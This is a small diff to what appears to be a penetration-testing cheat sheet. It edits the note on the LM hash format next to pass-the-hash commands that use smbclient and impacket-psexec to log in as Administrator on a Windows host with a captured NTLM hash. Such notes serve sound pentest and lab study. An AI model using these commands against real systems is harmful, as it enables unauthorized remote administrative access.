@@ -233,7 +233,7 @@ windows-auth uses NTLM
 	smbclient //123.123.123.123/share -U Administrator --pw-nt-hash <hash>
 
 	impacket-psexec -hashes <LM hash>:<NT hash> Administrator@123.123.123.123
-if `LM hash` is unused, fill it with `00000000000000000000000000000000`.  Same format for `impacket-wmiexec`
+if `LM hash` is unused, do `:<NT hash>`. Same format for `impacket-wmiexec`. Alternatively, add 32 0s for LM Hash.  
 
 # STAGE 3 - PRIVILEGE ESCALATION
 ## Weakness Enumeration (Linpeas/Winpeas)
